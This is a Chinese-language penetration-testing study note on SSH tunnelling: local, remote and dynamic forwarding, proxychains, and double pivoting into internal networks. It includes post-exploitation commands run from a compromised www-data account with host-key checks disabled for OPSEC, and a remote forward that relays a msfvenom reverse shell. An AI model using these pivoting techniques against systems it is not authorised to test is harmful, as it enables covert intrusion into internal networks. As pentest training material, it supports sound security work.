---
tags:
  - 渗透/后渗透
---
## SSH原理概述

> https://www.ramkitech.com/2012/04/how-to-do-ssh-tunneling-port-forwarding.html
> 在terminal中，当我们敲入ssh someone@private-server.org时，terminal application将调用ssh client，ssh client则连接到private-server.org机器的22端口(由ssh server监听).然后client和server交换Identitiy,public key, cipher suite info并且在server端创建一个新的shell process.随后client和server之间就建立了安全的通道了,这样之后的所有command及response都通过这个secure channel来传递。
> 比如当ssh连接建立后，我执行ls命令。那么ls命令将由ssh client加密封装通过该通道发往server。server则解密取出命令'ls'并且在shell(该shell就是ssh链接创建时所创建的)中执行,所有的输出将被redirect到该隧道的另一端-ssh client上,最后ssh client则解密取出output消息打印在terminal application上。

- ssh 可以同时有许多channels（Shell、Data、X11 Forwarding等），每个channel代表一个服务。
- 通常情况下我们就是使用的 shell channel（可以用 `-N` 忽略创建），但ssh隧道模式下我们用的 data channel。

## 3种类型

### 命令总结

`ssh -L/R [bind_address:]sourcePort:forwardToHost:onPort remoteHost`

- L/R指示 `sourcePort` 是在localhost端（执行命令的host）还是remoteHost
	- 注意：`sourcePort` 是指L/R（本地/远端）要开启监听的端口。例如-R的话是指在远端开启，本地是不会开启端口监听的。
- `forwardToHost:onPort` 不必局限在2台机器之间（参考）
- 注意可以定义多个 -L/R


#### OPSEC

![[Pasted image 20240817183916.png]]

```bash
ssh -f -N -R 1122:10.5.5.11:22 -R 13306:10.5.5.11:3306 -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" -i /tmp/keys/id_rsa kali@10.11.0.4
```

- 在Ajla上用www-data用户执行远程端口转发
- 防止在目标机器上保存我们kali的主机公钥
- 为www-data用户生成ssh密钥，并加一些限制（srcIP、仅端口转发、不分配伪终端），将公钥加入kali的 `authorized_keys` 文件：`from="10.11.1.250",command="echo 'This account can only be used for port forwarding'",no-agent-forwarding,no-X11-forwarding,no-pty ssh-rsa ssh-rsa AAAAB3Nz<SNIP>nin www-data@ajla`


#### 有用选项

-fNTCg

- -f：后台进程，不占用当前shell，只有认证时会到前台。（似乎即使Meterpreter进程死了，ssh隧道依旧生效）
- -N：静默连接（只当作隧道。即不创建shell channel，不登录到远程shell、不发出ssh命令）
- -T：远程主机上不分配伪终端。**通常和N连用**，不过分配了也没事，只是有点没必要。（扩展：本机连接远程远程主机的交互实际上是在与远程主机的伪终端交互）
- -C：压缩。减少带宽，但是可能增加CPU负荷（因为要加解压缩）
- -g：GatewayPorts 关键字，我们可以通过指定它使得其他机器也能使用这个本地端口转发。允许远端host连接本地用于转发的端口。本地端口转发绑定的是 lookback 接口（即上面 `bind_address` 的部分，不开启GatewayPorts配置的话，这里默认localhost），这意味着只有 localhost 或者 127.0.0.1 才能使用本机的端口转发 , 其他机器发起的连接只会得到“ connection refused. ”。【如果不加这个参数，只允许本地主机使用这个端口转发。更安全】


### 1.动态端口转发

- 动态：不必为每个目标创建本地监听端口，一个动态端口应付所有目标——比本地端口转发简约。
	- 服务器检查数据包并决定我们需要将数据包发送到哪里

```shell-session
ssh -D 9050 ubuntu@10.129.15.50
```
![[Pasted image 20240817182226.png]]{ width='600' }

就是在SSH Client前设置个（SOCKS）代理server，并绑定local port 9050。随后用登陆ubuntu并建立ssh connection。

之后在浏览器配置SOCKSv5代理就可以用浏览器访问ubuntu甚至是内网（因为命令在ubuntu解析，ubuntu有内网路由）的资源了。

#### proxychains

> [!note] 现在用proxychains-ng

配置代理IP：`sudo vim /etc/proxychains4.conf`
使用proxychains：`proxychains4 remmina`


也可以在 `~/.ssh/ssh_config` 里添加配置方便操作：
```
Host dest   
	Hostname 192.168.56.10   
	Port 22   
	User ubuntu   
	IdentityFile ~/.ssh/id_rsa
	DynamicForward localhost:5963
```

运行 `ssh dest` 之后，ssh会在本地绑定一个支持SOCKS协议的端口（此处为5963）。


### 2.本地端口转发

```shell-session
ssh -L 1234:localhost:3306 ubuntu@10.129.202.64
```
![[Pasted image 20240817183232.png]]{ width='600' }

相当于本地ssh client充当代理。Attack的ssh client的监听绑定了1234端口，所以所有到1234的流量都会转发到ssh client，然后流向远端。


进行连接的命令其实会根据remote port的服务进行选择。如可以这样：

- 转发ftp端口：`ftp localhost:localport`
- 转发rdp端口：`rdesktop localhost:localport`


### 3.远程端口转发

```shell-session
ssh -R <PivotHost>:8080:0.0.0.0:8000 ubuntu@<Target> -vN
```
![[Pasted image 20240817183638.png]]{ width='600' }

上图的例子中，Victim执行的msfvenom payload是回连 `Ubuntu的8080`，handler监听 `0.0.0.0:8000`。  
反弹shell回连Ubuntu后通过SSH隧道转发到本地8000端口，得以成功远控。


#### SSH Reverse Dynamic Forward

![[Pasted image 20240817185238.png]]{ width='500' }



## For Windows

### 建立ssh服务端

- WinSSHD： [https://www.bitvise.com/ssh-server](https://www.bitvise.com/ssh-server)
- OpenSSH： [https://sshwindows.sourceforge.net/](https://sshwindows.sourceforge.net/)

关于Proxifier： [https://posts.specterops.io/offensive-security-guide-to-ssh-tunnels-and-proxies-b525cbd4d4c6](https://posts.specterops.io/offensive-security-guide-to-ssh-tunnels-and-proxies-b525cbd4d4c6)


> [!note] 或者在cmd使用[[SSH Tunneling#SSH Reverse Dynamic Forward|远程动态转发]]！




## 高级运用

### Double Pivoting

> https://theyhack.me/Proxychains-Double-Pivoting/

![[Pasted image 20240818001741.png]]{ width='500' }

目标：从attack访问destbox。  
可以想象box1为WebSrv，box2为FileSrv，destbox为DC/特权PC。  
假设box1连接box2、box2连接destbox可以简单实现（因为都属于内网）。  
于是attack无法正向连接box1是通常的情况，所以需要box1反连attack。
#### reverse tunneling

```bash
# 1. attack:2222 ==== jumpbox1:22
they@jumpbox1.local:~$ ssh -fN -R 2222:127.0.0.1:22 <you>@attack.local
# 2. attack上的动态端口8888，连接到jumpbox1
they@attack.local:~$ ssh -fN -D 8888 <jumpbox1-user>@127.0.0.1 -p 2222
## 1&2 in oneline
they@jumpbox1.local:~$ ssh -f -R 2222:127.0.0.1:22 attack.local "ssh -fN -D 8888 127.0.0.1 -p 2222"

# 连接到box1之后重复执行动态隧道的步骤——即前文假设可简单实现的内容
they@jumpbox1.local:~$ ssh -fN -D 9999 user@jumpbox2.local

# 攻击机的proxychains.conf配置
<SNIP>
[ProxyList]
socks4  127.0.0.1 8888
socks4  127.0.0.1 9999 # For box1 to box2

# 访问destbox
they@attack.local:~$ proxychains4 -f proxychains.conf curl http://destbox.local
```

- 建议配置 `jumpbox1-user` 的有限制免密连接：[restrict accordingly to just tunnels](https://unix.stackexchange.com/questions/14312/how-to-restrict-an-ssh-user-to-only-allow-ssh-tunneling/14313#14313)


#### 内网隧道的另一实现思路

> https://posts.specterops.io/offensive-security-guide-to-ssh-tunnels-and-proxies-b525cbd4d4c6

按该文思路，针对前一节的“假设box1连接box2、box2连接destbox可以简单实现”的命令：
```bash
# 1. box2上建立动态隧道，但是SSH服务端在box2的loopback
they@jumpbox2.local:~$ ssh -D 10000 <jumpbox1-user>@127.0.0.1
# 2. box1:9999 ==== box2:10000
they@jumpbox2.local:~$ ssh -R 9999:127.0.0.1:10000 <jumpbox1-user>@jumpbox1.local

# 在攻击机上
# 正向连接box1：配置127.0.0.1:8888，然后用proxychains即可。
# 从box1反向隧道：参照前一节。
```
